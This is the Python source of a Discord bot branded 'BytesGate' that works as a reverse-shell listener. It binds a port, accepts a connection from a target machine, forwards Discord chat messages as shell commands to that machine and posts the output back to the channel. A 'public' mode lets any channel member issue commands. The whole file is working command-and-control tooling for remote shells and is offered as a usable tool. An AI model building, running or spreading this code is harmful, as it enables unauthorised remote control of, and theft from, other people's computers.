import socket, sys, time
import discord, os, re, json, asyncio
from discord.ext import commands
from discord.ext.commands import MissingPermissions


with open('config.json', 'r') as f:
    config = json.load(f)
    allowed_channel = config['Allow_to_perform_command_on_channel_ID']
    role_allowed = config['Whitelist_role_id_interger']
    token = config['TOKEN']
    delay_between_command = config['Delay_between_command']
    default_port = str(config['Default_port'])
    listener_timeout = config['Listener_Timeout']

bot = commands.Bot(command_prefix='$', help_command=None)
@bot.event
async def on_ready():
    os.system('cls')
    print(f"""██████  ██    ██ ████████ ███████      ██████   █████  ████████ ███████ 
██   ██  ██  ██     ██    ██          ██       ██   ██    ██    ██      
██████    ████      ██    █████       ██   ███ ███████    ██    █████   
██   ██    ██       ██    ██          ██    ██ ██   ██    ██    ██      
██████     ██       ██    ███████      ██████  ██   ██    ██    ███████ 
                                                                        
    The world first reverse-shell port listener bot on discord
    Developed by Login as {bot.user}""")

@bot.event
async def on_command_error(ctx, error):
    await ctx.message.delete()
    if isinstance(error, commands.MaxConcurrencyReached):
        await ctx.author.send(f"{ctx.author.mention} Now current bot is busy please wait until the queue is empty.", delete_after=60)
    elif isinstance(error, MissingPermissions):
        await ctx.send(f"{ctx.author.mention} You are missing permission to run this command.\nYou need to assign whitelist role to perform this command", delete_after=60)
    elif isinstance(error, (commands.MissingRole, commands.MissingAnyRole)):
        await ctx.send(f"{ctx.author.mention} You are missing permission to run this command.\nYou need to assign whitelist role to perform this command", delete_after=60)
    elif isinstance(error, commands.CommandNotFound):
        await ctx.send(f"{ctx.author.mention} that command was not found", delete_after=60)
    else:
        raise error


@bot.command(pass_context=True)
@commands.cooldown(rate=delay_between_command, per=1, type=commands.BucketType.user)
@commands.max_concurrency(5,per=commands.BucketType.default, wait=True)
@commands.has_any_role(*role_allowed)
async def clean(ctx, num: int = 100):
    if ctx.channel.id not in allowed_channel:
        await ctx.send(f"{ctx.author.mention} `Sorry but the bot is not allowed to work with this channel.`", delete_after=60)
    else:
        print(f"> Clean chat | requested by user <{ctx.author.name}#{ctx.author.discriminator}> | on channel <{ctx.channel.name}>")
        await ctx.channel.purge(limit=num)
        await ctx.send(f"> {ctx.author.mention}` Has cleaned {num} messages.`", delete_after=300)

@bot.command(pass_context=True)
@commands.cooldown(rate=delay_between_command, per=1, type=commands.BucketType.guild)
@commands.max_concurrency(2,per=commands.BucketType.default, wait=True)
async def bot_ip(ctx):
    if ctx.channel.id not in allowed_channel:
        await ctx.send(f"{ctx.author.mention} `Sorry but the bot is not allowed to work with this channel.`", delete_after=60)
    else:
        print(f"> Fetch bot IP | requested by user <{ctx.author.name}#{ctx.author.discriminator}> | on channel <{ctx.channel.name}>")
        local_ip = (socket.gethostbyname(socket.gethostname()))
        embed=discord.Embed(description=f">>> We only receive reverse-shell connection back to this specific IP\notherwise it wont be able to connect back to us", color=0xfbff00)
        embed.add_field(name="Reply to:", value=f"{ctx.message.author.mention}", inline=True)
        embed.add_field(name="BOT-IP:", value=f"**`{local_ip}`**", inline=True)
        embed.set_footer(text="Tips: IPv4 can be range from 0.0.0.0 to 255.255.255.255")
        embed.set_author(name="BytesGate Bot", url="https://discord.gg/FRWGzeKP2b", icon_url="https://cdn.discordapp.com/attachments/985576257049722961/986518827170930698/dlf.pt-bash-png-2167021.png")
        await ctx.send(embed=embed,delete_after=60)

@bot.command(pass_context=True)
@commands.cooldown(rate=delay_between_command, per=1, type=commands.BucketType.guild)
@commands.max_concurrency(1,per=commands.BucketType.default, wait=False)
async def lvnp(ctx, port: str = default_port, control_type: str = 'private'):
    if ctx.channel.id not in allowed_channel:
        await ctx.send(f"{ctx.author.mention} `Sorry but the bot is not allowed to work with this channel.`", delete_after=60)

    elif control_type.lower() not in ["private","public"]:
        embed=discord.Embed(title="Error", description="Incorrect usage.\n$lvnp <port> <private or public>\n or type `$lvnp help` for more helpful information.", color=0xff0000)
        await ctx.send(embed=embed, delete_after=30)

    else:
        if port.isdigit() is False:
            if port.lower() == "help":
                embed=discord.Embed(title="Usage", description="> **Type:** `$lvnp <port> <private or public>` \n*Example:* `$lvnp 9999 private`", color=0xfbff00)
                embed.set_author(name="BytesGate Bot | GUIDE", icon_url='https://cdn.discordapp.com/attachments/985576257049722961/986518827170930698/dlf.pt-bash-png-2167021.png')
                embed.add_field(name="Private", value=">>> If you set control type to public everyone can execute the shell command", inline=True)
                embed.add_field(name="Pubic", value=">>> If you set control type to private only you can execute the shell command", inline=True)
                embed.set_footer(text="This message will remove it self in 500 seconds")
                await ctx.send(embed=embed, delete_after=500)
            elif port.lower() == "" or port.lower() == None:
                port = default_port
        else:
            try:
                port = int(port)
                connecting_embed=discord.Embed(title="[Reverse shell listener]", color=0x9d8aff)
                connecting_embed.set_author(name="BytesGate Bot", url="https://discord.gg/FRWGzeKP2b", icon_url="https://cdn.discordapp.com/attachments/985576257049722961/986518827170930698/dlf.pt-bash-png-2167021.png")
                connecting_embed.set_thumbnail(url="https://media.discordapp.net/attachments/985576257049722961/986519212400996392/XVo6.gif?width=712&height=712")
                connecting_embed.add_field(name="Status:", value=f"Listening any connection back to port {port} in __**{listener_timeout}**__ sec.", inline=False)
                connecting_embed.set_footer(text="To stop port listener type: bg.stop | work only when connected from target")
                connected_embed=discord.Embed(title="[Reverse shell listener]", color=0x1eff00)
                connected_embed.set_author(name="BytesGate Bot", url="https://discord.gg/FRWGzeKP2b", icon_url="https://cdn.discordapp.com/attachments/985576257049722961/986518827170930698/dlf.pt-bash-png-2167021.png")
                connected_embed.set_thumbnail(url="https://media.discordapp.net/attachments/985576257049722961/986521642266148914/checked.gif")
                connected_embed.set_image(url="https://media.discordapp.net/attachments/985576257049722961/986538434728460308/ezgif-5-f540590fd1.gif")
                # connected_embed.set_footer(text="To stop port listener type: bg.stop")
                
                ip = "";
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(listener_timeout)
                s.bind((ip, port))
                s.listen(1)
                print(f"> Listening on port {port} | requested by user <{ctx.author.name}#{ctx.author.discriminator}> | on channel <{ctx.channel.name}>")
                msg_connecting = await ctx.send(embed=connecting_embed, delete_after=300)
                conn, addr = s.accept()
                target_ip = addr[0]
                print(f"> Listening on port {port} | has been successfully connected from {target_ip}")
                connected_embed.add_field(name="Status:", value=f"We recieved connection back from the target \n>**IPv4:**`{target_ip}`", inline=False)
                await msg_connecting.delete()
                await ctx.send(embed=connected_embed, delete_after=120)


                def private_check(m):
                    return m.author == ctx.author
                def public_check(m):
                    if not m.author.bot:
                        return m.author == ctx.author
                    else:
                        return False
                while True:
                    ans = conn.recv(1024).decode()
                    current_dir = (str(ans.split("\n")[-1]))
                    shell_terminal = ans.replace(current_dir,"")
                    embed=discord.Embed(title=f"Shell from [{target_ip}]", description="```\n"+shell_terminal+f"\n```\n> `{current_dir}`", color=0x000000)
                    embed.set_author(name="SHELL from BytesGate Bot", url="https://discord.gg/FRWGzeKP2b", icon_url="https://cdn.discordapp.com/attachments/985576257049722961/986518827170930698/dlf.pt-bash-png-2167021.png")
                    embed.set_footer(text="To clear discord: bg.clear | To stop port listener: bg.stop | To send blank message: .b")
                    await ctx.send(embed=embed)
                    try:
                        if control_type.lower() == 'private':
                            print(f"> Listening on port {port} | discord command reciever is close to private")
                            raw_reply = await bot.wait_for('message', check=private_check)
                        elif control_type.lower() == 'public':
                            print(f"> Listening on port {port} | discord command reciever is open to public")
                            raw_reply = await bot.wait_for('message', check=public_check)
                        command = raw_reply.content
                        
                        if command.lower() == 'bg.stop':
                            print(f"> Stop listening on port {port} | requested by user <{ctx.author.name}#{ctx.author.discriminator}>")
                            s.close()
                            break
                        elif command.lower() == 'bg.clear':
                            await ctx.channel.purge(limit=1000)
                        elif command.lower() == '.b':
                            await ctx.message.delete()
                            command = ''
                        print(f"> Listening on port {port} | {ctx.author.name}#{ctx.author.discriminator} has perform command\n   CMD: {command}")
                        command += "\n"

                        
                        conn.send(command.encode())
                        time.sleep(1)

                        # sys.stdout.write("Shell: " + ans.split("\n")[-1])
                    
                    except asyncio.TimeoutError: 
                        await ctx.send("Timeout")
            except socket.timeout:
                await msg_connecting.delete()
                print(f"> Listening on port {port} | Timeout")
                embed=discord.Embed(title="Error", description=f"Connection timeout the target took longer than {listener_timeout} sec to connect back to bot.", color=0xff0000)
                embed.set_author(name="BytesGate Bot", url="https://discord.gg/FRWGzeKP2b", icon_url="https://cdn.discordapp.com/attachments/985576257049722961/986518827170930698/dlf.pt-bash-png-2167021.png")
                await ctx.send(embed=embed, delete_after=120)
    
        print(f"> Listening on port {port} | has ended")
        embed=discord.Embed(title="The port listener has ended.", color=0x0011ff)
        await ctx.send(embed=embed, delete_after=119)
bot.run(token)
